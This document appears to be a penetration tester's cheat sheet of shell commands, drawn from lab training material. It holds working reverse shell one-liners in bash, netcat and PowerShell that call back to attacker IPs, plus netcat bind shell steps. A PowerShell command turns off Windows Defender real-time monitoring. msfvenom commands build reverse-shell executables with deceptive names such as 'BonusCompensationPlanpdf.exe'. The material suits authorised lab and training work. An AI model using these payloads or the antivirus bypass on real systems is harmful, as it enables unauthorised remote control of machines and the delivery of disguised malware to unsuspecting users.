https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

One liner bash shell
```
bash -c "bash -i >& /dev/tcp/<IP>/443 0>&1"
```

How to make a fully interactive shell
```
## Python version needed for this to run properly
python3 -c 'import pty;pty.spawn("/bin/bash")' 
CTRL+Z 
stty raw 
-echo 
fg 
export TERM=xterm

#not all steps may be needed
```
# Bind Shells
## **What Is It?**

With a bind shell, the `target` system has a listener started and awaits a connection from a pentester's system (attack box).
### **No. 1: Server - Target starting Netcat listener**
```bash
Target@server:~$ nc -lvnp 7777
```

In this instance, the target will be our server, and the attack box will be our client. Once we hit enter, the listener is started and awaiting a connection from the client.

Back on the client (attack box), we will use nc to connect to the listener we started on the server.

### **No. 2: Client - Attack box connecting to target**
```bash
nc -nv 10.129.41.200 7777 
```
### **No. 3: Server - Target receiving connection from client**
```bash
Target@server:~$ nc -lvnp 7777
```

Know that this is not a proper shell. It is just a Netcat TCP session we have established. We can see its functionality by typing a simple message on the client-side and viewing it received on the server-side.

# Reverse shell
### **Server (`attack box`)**
Reverse Shells
```bash
sudo nc -lvnp 443Listening on 0.0.0.0 443
```
## powerhsell reverse shell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$serverip',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

```

The `Windows Defender antivirus` (`AV`) software stopped the execution of the code. This is working exactly as intended, and from a `defensive` perspective, this is a `win`. From an offensive standpoint, there are some obstacles to overcome if AV is enabled on a system we are trying to connect with. For our purposes, we will want to disable the antivirus through the `Virus & threat protection settings` or by using this command in an administrative PowerShell console (right-click, run as admin):

### **Disable AV**
```powershell
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```
# One Liner
## Bash
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f

```
## Powershell
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
# crafting payloads with msfvenom
```
msfvenom -l payloads
```

## stageless
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```
